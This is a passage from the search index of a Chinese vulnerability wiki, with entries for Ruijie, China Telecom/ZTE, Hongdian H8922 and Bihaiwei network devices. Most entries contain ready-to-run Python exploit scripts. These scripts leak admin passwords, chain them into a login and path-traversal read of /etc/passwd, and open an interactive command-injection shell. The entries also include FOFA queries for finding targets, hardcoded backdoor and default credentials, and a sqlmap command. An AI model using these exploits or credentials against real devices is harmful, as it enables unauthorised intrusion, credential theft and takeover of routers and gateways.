$data[\"status\"] = 6; $data[\"msg\"] = \"username or password can't exist '\\r\\n'\"; json_echo($data); exit(); } if ($username == FALSE || $password == FALSE) { $data[\"status\"] = 5; $data[\"msg\"] = \"username or password can't empty\"; json_echo($data); exit(); } $res = execCli(\"exec\", \"webmaster $username $password\"); if ($res[\"status\"] != 1) { json_echo($res); exit(); } $isSuccess = trim($res[\"data\"]); if ($isSuccess == 0) { //用户名、账号验证成功 session_start(); $_SESSION['username'] = $username; //记录用户名 $_SESSION[\"lasttime\"] = time(); //记录登录时间 $config = @file_get_contents(DS . \"data\" . DS . \"web.config\"); //获取web配置信息 if ($config != false) { $config = unserialize($config); $_SESSION[\"timeout\"] = isset($config[\"loginTimeout\"]) ? $config[\"loginTimeout\"] * 60 : c(\"timeout\"); } else { $_SESSION[\"timeout\"] = c(\"timeout\"); } setcookie(\"user\", $_SESSION['username']); } $res[\"data\"] = $isSuccess; json_echo($res); } /** * 获取设备信息 */ function versionAction() { $info = $version = execCli(\"exec\", \"show version detail\", \"\"); $info[\"data\"] = preg_split(\"/\\r*\\n/\", $info[\"data\"]); json_echo($info); } } include_once(AROOT . \"init.php\"); //mvc初始化入口，放在底部 关键代码部分 if ($username == FALSE || $password == FALSE) { $data[\"status\"] = 5; $data[\"msg\"] = \"username or password can't empty\"; json_echo($data); exit(); } $res = execCli(\"exec\", \"webmaster $username $password\"); if ($res[\"status\"] != 1) { json_echo($res); exit(); } $isSuccess = trim($res[\"data\"]); 发送请求包，拼接 CLI指令 show webmaster user POST /login.php HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 49 Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Accept-Encoding: gzip username=admin&password=admin?show+webmaster+user 成功获取账号密码 漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 锐捷EG网关 管理员账号密码泄露 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin&password=admin?show+webmaster+user' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在执行 show webmaster user \\033[0m\".format(target_url)) if \"data\" in response.text and response.status_code == 200: print(\"\\033[36m[o] 成功获取, 响应为:{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) # if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/锐捷/锐捷EG易网关 branch_passw.php 远程命令执行漏洞.html":{"url":"book/网络设备漏洞/锐捷/锐捷EG易网关 branch_passw.php 远程命令执行漏洞.html","title":"锐捷EG易网关 branch_passw.php 远程命令执行漏洞","keywords":"","body":"锐捷EG易网关 branch_passw.php 远程命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:50:07 "},"book/网络设备漏洞/锐捷/锐捷EG易网关 download.php 任意文件读取漏洞.html":{"url":"book/网络设备漏洞/锐捷/锐捷EG易网关 download.php 任意文件读取漏洞.html","title":"锐捷EG易网关 download.php 任意文件读取漏洞","keywords":"","body":"锐捷EG易网关 download.php 后台任意文件读取漏洞 漏洞描述 锐捷EG易网关 download.php 存在后台任意文件读取漏洞，导致可以读取服务器任意文件 漏洞影响 [!NOTE] 锐捷EG易网关 FOFA [!NOTE] app=\"Ruijie-EG易网关\" 漏洞复现 首先登录到后台中(可以组合 锐捷EG易网关 管理员账号密码泄露漏洞) 漏洞文件 download.php _checkfile(iconv(\"UTF-8\", \"GB2312\",$filepath)); if ($filepointer !== false) { if (headers_sent()) { $this->error = \"无法下载文件，已经输出其他请求头！\"; } else { header(\"Pragma: public\"); header(\"Expires: 0\"); header(\"Cache-Control: must-revalidate, post-check=0, pre-check=0\"); header(\"Cache-Control: private\", false); header(\"Content-Type: {$this->_getMimeType($filename)}\"); header(\"Content-Disposition: attachment; filename=\\\"{$filename}\\\";\"); header(\"Content-Transfer-Encoding: binary\"); header(\"Content-Length: {$this->_getFileSize($filepointer)}\"); @ob_clean(); rewind($filepointer); fpassthru($filepointer); exit(); } } if ($this->error) { //有错误产生 ?> 文件下载失败 alert(\"error; ?>\"); true, \"data\" => $fileContent); json_echo($data); } } /** * 文件检查 */ private function _checkfile($filename) { if ($filename == false) { $this->error = \"请指定要下载的文件！\"; return FALSE; } $isallow = false; foreach ($this->allow as $pattern) { if (preg_match($pattern, $filename)) { $isallow = true; break; } } if (!$isallow) { $this->error = \"该文件不允许下载！\"; return FALSE; } if (!is_file($filename)) { $this->error = \"该文件不存在！\"; return FALSE; } else if (!is_readable($filename)) { //if (system(\"chmod +r \" . escapeshellarg($filename))) { $this->error = \"无法下载该文件，没有权限！\"; return FALSE; //} } return fopen($filename, \"rb\"); } /** * 获取文件mime类型 * @param string $fileName 文件名 * @return string */ private function _getMimeType($fileName) { $charset = v(\"charset\"); switch (pathinfo($fileName, PATHINFO_EXTENSION)) { case \"pdf\": return \"application/pdf\"; case \"exe\": return \"application/octet-stream\"; case \"zip\": return \"application/zip\"; case \"doc\": return \"application/msword\"; case \"xls\": return \"application/vnd.ms-excel\"; case \"ppt\": return \"application/vnd.ms-powerpoint\"; case \"gif\": return \"image/gif\"; case \"png\": return \"image/png\"; case \"jpeg\": case \"jpg\": return \"image/jpg\"; case \"htm\": return \"text/html;charset=gbk\"; case \"html\": if(!$charset) { return \"text/html;charset=gbk\"; }else { return \"text/html;charset=UTF-8\"; } default: return \"application/force-download\"; } } /** * 获取文件大小 * @return int */ private function _getFileSize($filePointer) { $stat = fstat($filePointer); return $stat['size']; } } include_once AROOT.'init.php'; //mvc初始化入口，放在底部 关键代码为 /** * 读取文本文件内容，支持ajax请求 */ public function read_txtAction() { $filename = v(\"file\"); if (!file_exists($filename)) { $data[\"status\"] = 2; $data[\"msg\"] = $filename . \"不存在\"; json_echo($data); exit(); } else { $fileContent = file_get_contents($filename); $data = array(\"status\" => true, \"data\" => $fileContent); json_echo($data); } } 直接从Get请求中提取 file参数读取文件，可以使用 ../ 跳转目录 验证POC /download.php?a=read_txt&file=../../../../etc/passwd 漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 锐捷EG网关 cli.php RCE \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin&password=admin?show+webmaster+user' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在执行 show webmaster user \\033[0m\".format(target_url)) if \"data\" in response.text and response.status_code == 200: password = re.findall(r'admin (.*?)\"', response.text)[0] print(\"\\033[36m[o] 成功获取, 账号密码为: admin {} \\033[0m\".format(password)) POC_2(target_url, password) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url, password): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin&password={}'.format(password) try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在登录..... \\033[0m\".format(target_url)) if \"status\" in response.text and \"1\" in response.text and response.status_code == 200: ruijie_cookie = \"RUIJIEID=\" + re.findall(r\"'Set-Cookie': 'RUIJIEID=(.*?);\", str(response.headers))[0] + \";user=admin;\" print(\"\\033[36m[o] 成功获取管理员Cookie: {} \\033[0m\".format(ruijie_cookie)) POC_3(target_url, ruijie_cookie) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) def POC_3(target_url, ruijie_cookie): vuln_url = target_url + \"/download.php?a=read_txt&file=../../../../etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(ruijie_cookie) } try: response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在读取 /etc/passwd..... \\033[0m\".format(target_url)) if \"root:\" in response.text and response.status_code == 200: print(\"\\033[36m[o] 成功读取 /etc/passwd \\n[o] 响应为:{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/锐捷/锐捷NBR 1300G路由器 越权CLI命令执行漏洞.html":{"url":"book/网络设备漏洞/锐捷/锐捷NBR 1300G路由器 越权CLI命令执行漏洞.html","title":"锐捷NBR 1300G路由器 越权CLI命令执行漏洞","keywords":"","body":"锐捷NBR 1300G路由器 越权CLI命令执行漏洞 漏洞描述 锐捷NBR 1300G路由器 越权CLI命令执行漏洞，guest账户可以越权获取管理员账号密码 漏洞影响 [!NOTE] 锐捷NBR路由器 FOFA [!NOTE] title=\"锐捷网络 --NBR路由器--登录界面\" 漏洞复现 登录页面如下 查看流量发现 CLI命令流量 请求包为 POST /WEB_VMS/LEVEL15/ HTTP/1.1 Host: Connection: keep-alive Content-Length: 73 Authorization: Basic User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Content-Type: text/plain;charset=UTF-8 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: auth=; user= x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 command=show version&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant. 测试发现执行其他命令需要权限，查看手册发现存在低权限 guest账户（guest/guest） 登录后发送请求包，执行CLI命令 (show webmaster user) 查看用户配置账号密码 成功获取所有用户的账号密码 webmaster level 0 username admin password guest webmaster level 0 username guest password guest 漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 锐捷NBRNBR1300G 路由器 越权CLI命令执行漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/WEB_VMS/LEVEL15/\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } data = 'command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在执行 show webmaster user \\033[0m\".format(target_url)) if \"webmaster\" in response.text and \" password\" in response.text and response.status_code == 200: user_data = re.findall(r'webmaster level 0 username admin password (.*?)', response.text)[0] print(\"\\033[36m[o] 成功获取, 管理员用户账号密码为: admin/{} \\033[0m\".format(user_data)) else: print(\"\\033[31m[x] 请求失败:{} \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/锐捷/锐捷ISG 账号密码泄露漏洞.html":{"url":"book/网络设备漏洞/锐捷/锐捷ISG 账号密码泄露漏洞.html","title":"锐捷ISG 账号密码泄露漏洞","keywords":"","body":"锐捷ISG 账号密码泄露漏洞 漏洞描述 锐捷ISG 存在账号密码泄露漏洞，通过查看前端，可以获取密码的md5值, 解密后获取后台权限 漏洞影响 [!NOTE] 锐捷ISG FOFA [!NOTE] title=\"RG-ISG\" 漏洞复现 登录页面如下 F12 查看到账号密码 解密md5 后登陆系统 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/电信/":{"url":"book/网络设备漏洞/电信/","title":"电信","keywords":"","body":"电信 电信网关配置管理系统 SQL注入漏洞 电信中兴ZXHN F450A网关 默认管理员账号密码漏洞 电信天翼网关F460 web_shell_cmd.gch 远程命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/电信/电信网关配置管理系统 SQL注入漏洞.html":{"url":"book/网络设备漏洞/电信/电信网关配置管理系统 SQL注入漏洞.html","title":"电信网关配置管理系统 SQL注入漏洞","keywords":"","body":"电信网关配置管理系统 SQL注入漏洞 漏洞描述 电信网关配置管理系统 前台登陆页面用户名参数存在SQL注入漏洞 漏洞影响 [!NOTE] 电信网关配置管理系统 FOFA [!NOTE] body=\"src=\\\"img/dl.gif\\\"\" && title=\"系统登录\" 漏洞复现 登录页面如下 设备存在默认弱口令 admin/admin 登录的请求包为 POST /manager/login.php HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 53 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=2lfi6enp5gehalrb92594c80i6 Connection: close Name=admin&Pass=admin 保存为文件使用 Sqlmap工具，注入点为 Name参数 sqlmap -r sql-1.txt -p Name --risk 3 Goby & POC [!NOTE] Hsmedia Hgateway default account 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/电信/电信中兴ZXHN F450A网关 默认管理员账号密码漏洞.html":{"url":"book/网络设备漏洞/电信/电信中兴ZXHN F450A网关 默认管理员账号密码漏洞.html","title":"电信中兴ZXHN F450A网关 默认管理员账号密码漏洞","keywords":"","body":"电信中兴ZXHN F450A网关 默认管理员账号密码漏洞 漏洞描述 电信中兴ZXHN F450A网关 存在默认管理员账号密码 漏洞影响 [!NOTE] 电信中兴ZXHN F450A网关 FOFA [!NOTE] ZXHN F450A 漏洞描述 登录页面如下 user/pass useradmin/nE7jA%5m 普通管理员 telecomadmin/nE7jA%5m 超级管理员 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/电信/电信天翼网关F460 web_shell_cmd.gch 远程命令执行漏洞.html":{"url":"book/网络设备漏洞/电信/电信天翼网关F460 web_shell_cmd.gch 远程命令执行漏洞.html","title":"电信天翼网关F460 web_shell_cmd.gch 远程命令执行漏洞","keywords":"","body":"电信天翼网关F460 web_shell_cmd.gch 远程命令执行漏洞 漏洞描述 电信天翼网关F460 web_shell_cmd.gch文件存在命令调试界面，攻击者可以利用获取服务器权限 漏洞影响 [!NOTE] 电信天翼网关F460 FOFA [!NOTE] title=\"F460\" 漏洞复现 出现漏洞的文件为 web_shell_cmd.gch 直接输入命令就可以执行 cat /etc/passwd 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/宏电/":{"url":"book/网络设备漏洞/宏电/","title":"宏电","keywords":"","body":"宏电 宏电 H8922 Telnet后门漏洞 CVE-2021-28149 宏电 H8922 后台命令执行漏洞 CVE-2021-28150 宏电 H8922 后台管理员信息泄露漏洞 CVE-2021-28151 宏电 H8922 后台任意文件读取漏洞 CVE-2021-28152 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/宏电/宏电 H8922 Telnet后门漏洞 CVE-2021-28149.html":{"url":"book/网络设备漏洞/宏电/宏电 H8922 Telnet后门漏洞 CVE-2021-28149.html","title":"宏电 H8922 Telnet后门漏洞 CVE-2021-28149","keywords":"","body":"宏电 H8922 Telnet后门漏洞 CVE-2021-28149 漏洞描述 宏电 H8922 Telnet存在硬编码的账号密码 且默认开放 5188端口连接，可以以Root身份获取权限 漏洞影响 [!NOTE] 宏电 H8922 ZoomEy [!NOTE] app:\"Hongdian H8922 Industrial Router\" 漏洞复现 使用Telnet连接目标5188端口，账号密码为 root/superzxmn 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/宏电/宏电 H8922 后台命令执行漏洞 CVE-2021-28150.html":{"url":"book/网络设备漏洞/宏电/宏电 H8922 后台命令执行漏洞 CVE-2021-28150.html","title":"宏电 H8922 后台命令执行漏洞 CVE-2021-28150","keywords":"","body":"宏电 H8922 后台命令执行漏洞 CVE-2021-28150 漏洞描述 宏电 H8922 后台中的网络测试模块中存在命令执行漏洞。通过命令拼接执行任意命令 漏洞影响 [!NOTE] 宏电 H8922 ZoomEy [!NOTE] app:\"Hongdian H8922 Industrial Router\" 漏洞复现 登录后台(存在访客用户默认账号密码 guest/guest) 使用 ; 命令拼接执行任意命令 请求包为 POST /tools.cgi HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 96 Cache-Control: max-age=0 Authorization: Basic Z3Vlc3Q6Z3Vlc3Q= Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close op_type=ping&destination=;cat /etc/passwd&user_options=uid%3D0%28root%29+gid%3D0%28root%29%0D%0A 漏洞POC import requests import sys import random import re from lxml import etree from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mTitle : 宏电 H8922 后台命令执行漏洞 CVE-2021-28150 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, cmd): vuln_url = target_url + \"/tools.cgi\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } data = \"op_type=ping&destination=;cat /etc/passwd&user_options=uid%3D0%28root%29+gid%3D0%28root%29%0D%0A\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] 正在请求 {}/tools.cgi \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,存在访客账号 guest/guest 成功执行 cat /etc/passwd \\033[0m\".format(target_url)) html = etree.HTML(response.text) cmd_test = html.xpath('/html/body/div[1]/div/div[2]/div/form/fieldset[2]/div/textarea/text()')[0] print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(cmd_test)) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/tools.cgi\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } data = \"op_type=ping&destination=;{}&user_options=uid%3D0%28root%29+gid%3D0%28root%29%0D%0A\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) html = etree.HTML(response.text) cmd_test = html.xpath('/html/body/div[1]/div/div[2]/div/form/fieldset[2]/div/textarea/text()')[0] print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(cmd_test)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() cmd = 'cat /etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url, cmd) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/宏电/宏电 H8922 后台管理员信息泄露漏洞 CVE-2021-28151.html":{"url":"book/网络设备漏洞/宏电/宏电 H8922 后台管理员信息泄露漏洞 CVE-2021-28151.html","title":"宏电 H8922 后台管理员信息泄露漏洞 CVE-2021-28151","keywords":"","body":"宏电 H8922 后台管理员信息泄露漏洞 CVE-2021-28151 漏洞描述 宏电 H8922 后台存在管理员信息泄露漏洞，攻击者使用任意账号登录后访问特殊的Url即可获取所有用户的账号和密码 漏洞影响 [!NOTE] 宏电 H8922 ZoomEy [!NOTE] app:\"Hongdian H8922 Industrial Router\" 漏洞复现 登录后台(存在访客用户默认账号密码 guest/guest) 漏洞存在于 backup2.cgi 文件中 分析后可得知实际运行后将会读取 /tmp/hdconfig/cli.conf 配置文件 其中配置文件中是含有所有用户密码以及敏感配置信息的 漏洞POC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mTitle : 宏电 H8922 后台管理员信息泄露漏洞 CVE-2021-28151 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/backup2.cgi\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/backup2.cgi.... \\033[0m\".format(target_url)) if 'service webadmin' in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,存在访客账号 guest/guest 成功读取配置文件 \\033[0m\".format(target_url)) print(\"\\033[36m[o] 响应为:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/宏电/宏电 H8922 后台任意文件读取漏洞 CVE-2021-28152.html":{"url":"book/网络设备漏洞/宏电/宏电 H8922 后台任意文件读取漏洞 CVE-2021-28152.html","title":"宏电 H8922 后台任意文件读取漏洞 CVE-2021-28152","keywords":"","body":"宏电 H8922 后台任意文件读取漏洞 CVE-2021-28152 漏洞描述 宏电 H8922 后台存在任意文件读取漏洞，低权限用户通过漏洞可以获取任意文件内容 漏洞影响 [!NOTE] 宏电 H8922 ZoomEy [!NOTE] app:\"Hongdian H8922 Industrial Router\" 漏洞复现 登录后台(存在访客用户默认账号密码 guest/guest) 漏洞存在于 log_download.cgi 文件中 使用type参数读取文件并下载日志给用户，使用 ../../ 可以跳转根目录读取任意文件 漏洞POC import requests import sys import random import re from lxml import etree from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mTitle : 宏电 H8922 后台任意文件读取漏洞 CVE-2021-28152 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, filename): vuln_url = target_url + \"/log_download.cgi?type=../..{}\".format(filename) headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] 正在请求 {}/log_download.cgi?type=../../etc/passwd \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,存在访客账号 guest/guest 成功读取 /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) while True: filename = input(\"\\033[35mFilename >>> \\033[0m\") if filename == \"exit\": sys.exit(0) else: POC_2(target_url, filename) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, filename): vuln_url = target_url + \"/log_download.cgi?type=../..{}\".format(filename) headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] {} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() filename = '/etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url, filename) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/碧海威/":{"url":"book/网络设备漏洞/碧海威/","title":"碧海威","keywords":"","body":"碧海威 碧海威 L7多款产品 后台命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/碧海威/碧海威 L7多款产品 后台命令执行漏洞.html":{"url":"book/网络设备漏洞/碧海威/碧海威 L7多款产品 后台命令执行漏洞.html","title":"碧海威 L7多款产品 后台命令执行漏洞","keywords":"","body":"碧海威 L7多款产品 后台命令执行漏洞 漏洞描述 碧海威 L7多款产品存在 后台命令执行漏洞，攻击者通过账号密码登录后台后，通过命令拼接造成命令注入 漏洞影响 [!NOTE] 碧海威 L7多款产品 FOFA [!NOTE] \"碧海威\" 漏洞复现 